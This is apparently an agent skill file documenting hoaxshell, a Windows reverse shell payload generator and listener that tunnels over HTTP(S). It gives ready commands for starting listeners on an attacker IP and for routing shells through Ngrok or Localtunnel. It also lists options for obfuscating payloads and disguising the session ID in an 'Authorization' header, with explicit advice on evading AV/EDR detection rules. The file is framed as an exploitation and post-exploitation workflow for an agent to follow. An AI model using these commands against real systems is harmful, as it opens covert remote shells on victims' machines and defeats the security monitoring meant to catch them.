---
name: hoaxshell
description: Generate and handle Windows reverse shell payloads that abuse the HTTP(S) protocol to establish beacon-like communication. Use this tool during the exploitation and post-exploitation phases to bypass traditional firewall restrictions and security solutions that monitor for standard reverse shell traffic by masquerading as legitimate web traffic.
---

# hoaxshell

## Overview
Hoaxshell is a Windows reverse shell payload generator and handler that utilizes the HTTP(S) protocol. It establishes a beacon-like session, making it difficult for some security products to detect compared to traditional TCP reverse shells. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume hoaxshell is already installed. If not, use:

```bash
sudo apt install hoaxshell
```

## Common Workflows

### Basic HTTP Shell
Generate a payload and start a listener on the default port (8080):
```bash
hoaxshell -s <your_ip>
```

### Stealthy HTTP Shell (Recommended)
Uses `Invoke-RestMethod` instead of `Invoke-WebRequest` and masks the session ID in a standard header like "Authorization":
```bash
hoaxshell -s <your_ip> -i -H "Authorization"
```

### Encrypted Shell with Self-Signed Certificate
Generate certificates and start an HTTPS listener:
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
hoaxshell -s <your_ip> -c cert.pem -k key.pem
```

### Using Tunneling Services
Automatically generate a payload and listener using Ngrok or Localtunnel:
```bash
hoaxshell -ng
# OR
hoaxshell -lt
```

## Complete Command Reference

```
usage: hoaxshell.py [-h] [-s SERVER_IP] [-c CERTFILE] [-k KEYFILE] [-p PORT]
                    [-f FREQUENCY] [-i] [-H HEADER] [-x EXEC_OUTFILE] [-r]
                    [-o] [-v SERVER_VERSION] [-g] [-t] [-cm] [-lt] [-ng] [-u]
                    [-q]
```

### Options

| Flag | Description |
|------|-------------|
| `-h, --help` | Show help message and exit. |
| `-s, --server-ip <IP/Domain>` | Your hoaxshell server IP address or domain. |
| `-c, --certfile <path>` | Path to your SSL certificate for HTTPS. |
| `-k, --keyfile <path>` | Path to the private key for your certificate. |
| `-p, --port <port>` | Server port (default: 8080 for HTTP, 443 for HTTPS). |
| `-f, --frequency <sec>` | Frequency of cmd execution queue cycle. Default: 0.8s. Values < 0.8 may cause issues. |
| `-i, --invoke-restmethod` | Use `Invoke-RestMethod` in payload instead of `Invoke-WebRequest`. |
| `-H, --Header <name>` | Set a custom HTTP header name for session ID transfer (default is random). |
| `-x, --exec-outfile <path>` | Write and execute commands from a file on the victim instead of `Invoke-Expression`. Note: Cannot change directories with this method. |
| `-r, --raw-payload` | Generate raw PowerShell payload instead of Base64 encoded. |
| `-o, --obfuscate` | Obfuscate the generated payload. |
| `-v, --server-version <str>` | Set the "Server" response header value (default: Microsoft-IIS/10). |
| `-g, --grab` | Attempt to restore a live session (default: false). |
| `-t, --trusted-domain` | Use with a domain (-s) and trusted certs (-c/-k) for shorter, less detectable HTTPS payloads. |
| `-cm, --constraint-mode` | Generate payload compatible with PowerShell Constraint Language Mode (sacrifices some stdout accuracy). |
| `-lt, --localtunnel` | Generate payload and tunnel using Localtunnel. |
| `-ng, --ngrok` | Generate payload and tunnel using Ngrok. |
| `-u, --update` | Pull the latest version from the original repository. |
| `-q, --quiet` | Do not print the banner on startup. |

## Notes
- **Detection**: While hoaxshell is designed to bypass some AV/EDR, the default random header names can sometimes be flagged by regex-based rules. Using `-H "Authorization"` or similar common headers is advised.
- **Persistence**: If using `-x` (exec-outfile), ensure the path is writable and properly escaped (e.g., `"C:\Users\\\$env:USERNAME\.local\hack.ps1"`).
- **Constraints**: When using the `-x` method, you cannot use `cd` to change directories; all commands should use absolute paths.